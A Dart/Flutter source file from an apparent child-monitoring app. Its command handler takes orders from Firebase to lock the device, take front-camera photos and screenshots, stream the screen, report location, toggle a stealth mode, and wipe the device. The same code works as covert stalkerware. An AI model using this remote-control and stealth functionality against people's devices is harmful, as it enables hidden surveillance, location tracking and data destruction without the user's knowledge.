import 'package:firebase_database/firebase_database.dart';
import 'package:child_app/utils/constants.dart';
import 'package:child_app/utils/native_channel.dart';
import 'package:child_app/services/screen_stream_service.dart';
import 'package:child_app/services/location_service.dart';

class CommandHandler {
  static final Map<String, DateTime> _lastCommandTimes = {};
  static bool _isInitialized = false;

  static void init() async {
    if (_isInitialized) return;
    _isInitialized = true;

    final deviceId = await Constants.getDeviceId();
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands');
    
    ref.onChildAdded.listen((event) async {
      final command = event.snapshot.value as Map<dynamic, dynamic>;
      final commandId = event.snapshot.key!;
      
      // কমান্ড ডুপ্লিকেশন চেক (৩০ সেকেন্ডের মধ্যে একই কমান্ড)
      final lastTime = _lastCommandTimes[commandId];
      if (lastTime != null && DateTime.now().difference(lastTime) < const Duration(seconds: 30)) {
        await ref.child(commandId).update({'status': 'ignored', 'reason': 'duplicate_command'});
        return;
      }
      
      _lastCommandTimes[commandId] = DateTime.now();
      
      if (command['status'] == 'pending') {
        await _processCommand(commandId, command, deviceId);
      }
    });
  }

  static Future<void> _processCommand(String commandId, Map<dynamic, dynamic> command, String deviceId) async {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands/$commandId');
    
    try {
      // কমান্ড টাইপ অনুযায়ী প্রসেসিং
      switch (command['type']) {
        case 'lock_device':
          await NativeChannel.lockDevice();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'take_photo':
          await NativeChannel.takeFrontPhoto();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'take_screenshot':
          await NativeChannel.captureScreen();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'start_stream':
          await ScreenStreamService.startStreaming();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'stop_stream':
          await ScreenStreamService.stopStreaming();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'get_location':
          final locationData = await LocationService.getCurrentLocation();
          await ref.update({
            'status': 'completed',
            'location': {
              'lat': locationData.latitude,
              'lng': locationData.longitude,
              'accuracy': locationData.accuracy,
              'timestamp': ServerValue.timestamp,
            }
          });
          break;
          
        case 'enable_stealth':
          await NativeChannel.enableStealthMode();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'disable_stealth':
          await NativeChannel.disableStealthMode();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        case 'wipe_device':
          await NativeChannel.wipeDevice();
          await _updateCommandStatus(ref, 'completed');
          break;
          
        default:
          await _updateCommandStatus(ref, 'failed', error: 'অজানা কমান্ড টাইপ: ${command['type']}');
      }
    } catch (e) {
      await _updateCommandStatus(ref, 'failed', error: e.toString());
    }
  }

  static Future<void> _updateCommandStatus(
    DatabaseReference ref, 
    String status, {
    String? error
  }) async {
    final updateData = {'status': status};
    if (error != null) {
      updateData['error'] = error;
    }
    await ref.update(updateData);
  }
}